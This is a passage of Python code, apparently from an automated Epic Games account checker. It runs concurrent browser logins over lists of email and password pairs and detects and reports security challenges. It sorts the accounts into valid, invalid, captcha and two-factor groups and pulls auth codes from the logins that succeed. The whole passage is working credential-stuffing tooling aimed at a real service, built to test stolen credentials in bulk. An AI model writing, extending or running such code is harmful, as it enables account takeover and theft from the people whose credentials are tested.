                            print(f"❌ {email} - Challenge timeout after 45 seconds")
                            return AccountStatus.CAPTCHA, {'error': 'Security challenge timeout'}
                    
                    # Additional wait for page stabilization
                    await asyncio.sleep(random.uniform(2, 4))
                    
                    # Final check for any remaining challenge indicators
                    try:
                        title = await page.title()
                        current_url = page.url.lower()
                        
                        if any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge', 'security check']):
                            print(f"🤖 {email} - Persistent challenge in title: {title}")
                            return AccountStatus.CAPTCHA, {'error': f'Persistent security challenge: {title}'}
                        
                        if any(indicator in current_url for indicator in ['challenge', 'captcha', 'verify']):
                            print(f"🤖 {email} - Challenge detected in URL: {current_url}")
                            return AccountStatus.CAPTCHA, {'error': 'Challenge page detected'}
                            
                    except:
                        pass
                        
                except Exception as e:
                    print(f"⚠️ {email} - Error checking for challenges: {e}")
                    pass
                
                # Handle cookie consent if present
                cookie_selectors = [
                    "text=/Accept All/i",
                    "text=/Accept All Cookies/i",
                    "[data-testid*='accept' i]",
                    "button:has-text('Accept')"
                ]
                await self.click_if_present(page, cookie_selectors)
                
                # Wait a bit for page to stabilize
                await asyncio.sleep(2)
                
                # Fill email - EXACT selectors found from Epic Games login page
                email_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "input#email",                              # Primary ID selector
                    "input[name='email']",                      # Primary name selector  
                    "input[type='email']",                      # Primary type selector
                    "input[autocomplete='username']",           # Autocomplete attribute
                    # Fallback selectors for different Epic Games page variations
                    "input[id='usernameOrEmail']",
                    "input[name='usernameOrEmail']",
                    "input[data-testid='email-input']",
                    "input[data-testid='username-input']",
                    "input[inputmode='email']",
                    # Form-based selectors
                    "form input[type='email']",
                    "form input[name='email']",
                    "#email",
                    # Generic fallbacks
                    "input[placeholder*='Email' i]",
                    "input[aria-label*='email' i]",
                    "input[name='username']",
                    "input[id*='email' i]"
                ]
                
                print(f"📧 {email} - Filling email...")
                if not await self.fill_if_present(page, email_selectors, email):
                    return AccountStatus.ERROR, {'error': 'Could not find email input field'}
                
                # Click Continue button if present
                continue_selectors = [
                    "button:has-text('Continue')",
                    "button[type='submit']",
                    "text=Continue"
                ]
                await self.click_if_present(page, continue_selectors)
                
                # Wait a bit for potential page change
                await asyncio.sleep(1)
                
                # Fill password - EXACT selectors found from Epic Games login page
                password_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "input#password",                           # Primary ID selector
                    "input[name='password']",                   # Primary name selector
                    "input[type='password']",                   # Primary type selector
                    "input[autocomplete='current-password']",   # Autocomplete attribute
                    # Fallback selectors for different Epic Games page variations
                    "input[data-testid='password-input']",
                    "input[data-testid='password']",
                    "input[data-component='password']",
                    # Form-based selectors
                    "form input[type='password']",
                    "form input[name='password']",
                    "#password",
                    # Generic fallbacks
                    "input[placeholder*='Password' i]",
                    "input[aria-label*='password' i]",
                    "input[id*='password' i]"
                ]
                
                print(f"🔐 {email} - Filling password...")
                if not await self.fill_if_present(page, password_selectors, password):
                    return AccountStatus.ERROR, {'error': 'Could not find password input field'}
                
                # Click Sign In/Submit button - EXACT selectors found from Epic Games login page
                submit_selectors = [
                    # EXACT selectors from successful Epic Games login page
                    "button#sign-in",                           # Primary ID selector
                    "button[type='submit']",                    # Primary type selector
                    "button:has-text('Continue')",             # Primary text selector
                    # Fallback selectors for different Epic Games page variations
                    "input[type='submit']",
                    "button:has-text('Sign In')",
                    "button:has-text('Log In')",
                    "button:has-text('SIGN IN')",
                    "button:has-text('LOG IN')",
                    "button:has-text('CONTINUE')",
                    # Data attributes Epic Games commonly uses
                    "button[data-testid='login-button']",
                    "button[data-testid='submit-button']",
                    "button[data-testid='sign-in-button']",
                    # ID and class patterns
                    "button#login",
                    "button#submit",
                    "button.login-button",
                    "button.submit-button",
                    # Form-based selectors
                    "form button[type='submit']",
                    "form button:last-child",
                    # Generic patterns
                    "button[id*='login' i]",
                    "button[id*='submit' i]",
                    "button[class*='login' i]",
                    "button[class*='submit' i]",
                    # Regex text matching
                    "text=/Sign in|Log in|Continue/i"
                ]
                
                print(f"🚀 {email} - Submitting login...")
                if not await self.click_if_present(page, submit_selectors):
                    return AccountStatus.ERROR, {'error': 'Could not find submit button'}
                
                # Wait for navigation or result
                try:
                    await page.wait_for_load_state("domcontentloaded", timeout=15000)
                    await asyncio.sleep(3)  # Additional wait for page to stabilize
                except:
                    pass  # Continue even if timeout
                
                # Check current URL and page state
                current_url = page.url
                print(f"🔗 {email} - Current URL: {current_url}")
                
                # Detect outcome and extract auth code if successful
                status, details = await self.detect_outcome_and_extract_auth(page, email)
                
                print(f"✅ {email} - Result: {status.value} - {details.get('message', 'Success')}")
                
                return status, details
                
            except Exception as e:
                print(f"❌ {email} - Error during check: {str(e)}")
                return AccountStatus.ERROR, {'error': str(e)}
            
            finally:
                # Clean up context
                if context:
                    try:
                        await context.close()
                    except:
                        pass
    
    async def check_accounts_batch(self, accounts: List[Tuple[str, str]], progress_callback=None) -> Dict[str, List[Tuple[str, str, Dict[str, Any]]]]:
        """Check multiple accounts with progress tracking"""
        results = {
            'valid': [],
            'invalid': [],
            'captcha': [],
            '2fa': [],
            'error': []
        }
        
        # Create tasks for concurrent execution
        async def check_with_progress(i, account):
            email, password = account
            status, profile_info = await self.check_account(email, password)
            
            # Store account with profile info
            account_data = (email, password, profile_info)
            
            if status == AccountStatus.VALID:
                results['valid'].append(account_data)
            elif status == AccountStatus.INVALID:
                results['invalid'].append(account_data)
            elif status == AccountStatus.CAPTCHA:
                results['captcha'].append(account_data)
            elif status == AccountStatus.TWO_FA:
                results['2fa'].append(account_data)
            else:  # ERROR
                results['error'].append(account_data)
            
            # Call progress callback if provided
            if progress_callback:
                await progress_callback(i + 1, len(accounts))
            
            return status, profile_info
        
        # Create tasks
        tasks = [check_with_progress(i, account) for i, account in enumerate(accounts)]
        
        # Execute tasks with controlled concurrency (handled by semaphore)
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return results